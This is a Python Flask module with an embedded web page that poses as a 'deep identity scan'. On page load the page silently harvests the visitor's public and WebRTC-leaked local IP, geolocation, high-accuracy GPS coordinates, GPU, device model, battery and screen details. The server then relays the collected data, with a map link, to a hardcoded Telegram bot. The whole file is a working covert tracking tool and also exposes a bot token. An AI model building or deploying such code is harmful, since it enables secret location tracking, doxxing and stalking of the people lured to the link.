from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>ULTRA_PHANTOM_v10.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; overflow:hidden;}
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.95); box-shadow: 0 0 60px #0f0; position: relative; }
        .scan-line { width: 100%; height: 6px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 1s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body onload="capture()">
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">DEEP_IDENTITY_SCAN</h2>
        <p id="status">Syncing Neural IPv4 Nodes... [v10.0]</p>
        <div id="loader">STATUS: EXTRACTING_FULL_FINGERPRINT</div>
    </div>

    <script>
        async function capture() {
            try {
                // 1. DEDICATED IPv4 FETCH (Fix)
                const ip4Res = await fetch('https://api.ipify.org?format=json');
                const ip4Data = await ip4Res.json();
                
                const geoRes = await fetch('https://ipapi.co/' + ip4Data.ip + '/json/');
                const geo = await geoRes.json();

                // 2. ADVANCED BRAND & MODEL DETECTION
                const ua = navigator.userAgent;
                let brand = "Generic PC/Laptop";
                let model = "Workstation";
                
                // Hardware Benchmarking for Brand
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                let gpu = "Unknown";
                if(gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }

                if (/android/i.test(ua)) {
                    const match = ua.match(/Android.*;\\s*([^;]+);\\s*([^;\\s\\)]+)/);
                    brand = match ? match[1] : "Android Device";
                    model = match ? match[2] : "Mobile";
                    
                    // Logic to detect specific brands from GPU
                    if(gpu.includes("Adreno")) { 
                        if(ua.includes("Samsung")) brand = "Samsung";
                        else if(ua.includes("Vivo")) brand = "Vivo";
                        else if(ua.includes("Oppo")) brand = "Oppo";
                    }
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    brand = "Apple";
                    model = ua.match(/CPU\\s([^;]+)/)?.[1] || "iOS Device";
                } else if (navigator.platform.includes("Win")) {
                    brand = "Windows PC";
                }

                // 3. BATTERY & POWER
                let batt = "N/A";
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "On Battery") + ")";
                }

                // 4. WEBRTC (LOCAL IP)
                let localIP = "N/A";
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => { if(i && i.candidate) localIP = i.candidate.address; };

                // 5. GPS
                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null), {enableHighAccuracy:true}));
                const coords = await getPos();

                const intel = {
                    time: new Date().toLocaleString(),
                    ipv4: ip4Data.ip,
                    local_ip: localIP,
                    isp: geo.org || "N/A",
                    city: geo.city || "N/A",
                    country: geo.country_name || "N/A",
                    lat: coords ? coords.latitude : "Denied",
                    lon: coords ? coords.longitude : "Denied",
                    brand: brand,
                    model: model,
                    os: navigator.platform,
                    gpu: gpu,
                    ram: navigator.deviceMemory || "N/A",
                    cores: navigator.hardwareConcurrency || "N/A",
                    battery: batt,
                    screen: window.screen.width + "x" + window.screen.height,
                    lang: navigator.language,
                    agent: ua
                };

                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(intel)
                });

                document.getElementById('header').innerText = "FORENSICS_STABLE";
            } catch (e) { console.error(e); }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    try:
        i = request.json
        message = (
            f"🔥 *--- PHANTOM ELITE v10.0 REPORT ---* 🔥\\n\\n"
            f"🌐 *NETWORK INTEL*\\n"
            f"┣ *IPv4:* `{i['ipv4']}` (Fixed)\\n"
            f"┣ Local IP: `{i['local_ip']}`\\n"
            f"┗ ISP: `{i['isp']}`\\n\\n"
            f"📱 *DEVICE IDENTITY*\\n"
            f"┣ *BRAND:* `{i['brand']}`\\n"
            f"┣ *MODEL:* `{i['model']}`\\n"
            f"┣ OS: `{i['os']}`\\n"
            f"┗ GPU: `{i['gpu']}`\\n\\n"
            f"📍 *LOCATION*\\n"
            f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
            f"┗ Map: [Google Maps Link](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
            f"💻 *HARDWARE*\\n"
            f"┣ RAM: `{i['ram']} GB`\\n"
            f"┣ Cores: `{i['cores']}`\\n"
            f"┗ Battery: `{i['battery']}`\\n\\n"
            f"⚙️ *MISC*\\n"
            f"┣ Language: `{i['lang']}`\\n"
            f"┗ Screen: `{i['screen']}`\\n\\n"
            f"📎 *AGENT:* `{i['agent'][:100]}...`"
        )

        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
                      json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        return jsonify({"status": "Success"}), 200
    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)}), 500

